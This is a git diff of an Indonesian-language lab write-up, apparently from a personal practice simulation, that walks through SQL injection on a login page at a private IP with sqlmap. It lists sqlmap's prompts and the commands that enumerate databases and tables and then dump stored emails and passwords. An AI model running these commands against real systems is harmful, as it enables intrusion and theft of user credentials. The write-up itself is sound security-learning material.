@@ -371,18 +371,29 @@ Berikut adalah rekaman jejak (_screenshot_) dari simulasi langsung (Personal Pra
 Setelah mengeksekusi _payload_, SQLMap sukses membuktikan bahwa parameter `test` rentan di inject:
 ![Konfirmasi Celah SQLi](../../Assets/Images/SQLI.png)
 
+> [!Note]
+> saat aku sedang melakukan inject kalau ada pertanyaan seperti ini
+> it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+> for the remaining tests, do you want to include all tests for 'MySQL' extending provided risk (1) value? [Y/n] Y
+> injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+> GET parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+
 **2. Fingerprinting OS Target**
+
 SQLI secara otomatis menginformasikan Identitas mesin target **(Windows, Web Apache 2.4.53 , dan DBMS MySQL):**
 ![Fingerprinting OS Target](../../Assets/Images/OutputInject.png)
 
 **3. Enumeration Database (Dumping Database Names)**
+
 Menggunakan _flag_ `sqlmap -u 'http://10.48.136.243/ai/includes/user_login?email=test&password=test' --dbs` berhasil mengeluarkan semua nama database yang tersedia di dalam _server_ target (`ai, information_schema, mysql, performance_schema, phpmyadmin, test`):
 ![Daftar Nama Database](../../Assets/Images/dbsoutput.png)
 
 **4. Enumeration Table (Dumping Table Names)**
+
 Inject _database_ bernama `ai` menggunakan flag `sqlmap -u 'http://10.48.136.243/ai/includes/user_login?email=test&password=test' -D ai --tables` dan memunculkan tabel bernama `user`:
 ![Tabel di Dalam Database Users](../../Assets/Images/insidedbs.png)
 
 **5. The Final Dump**
+
 Melihat seluruh isi _database_ `ai` menggunakan _flag_ `sqlmap -u 'http://10.48.136.243/ai/includes/user_login?email=test&password=test' -D ai --dump`, akhirnya data _Email_ dan _Password_ secara mentah keluar dari _database_:
 ![Hasil Dump Username dan Password](../../Assets/Images/dumptable.png)
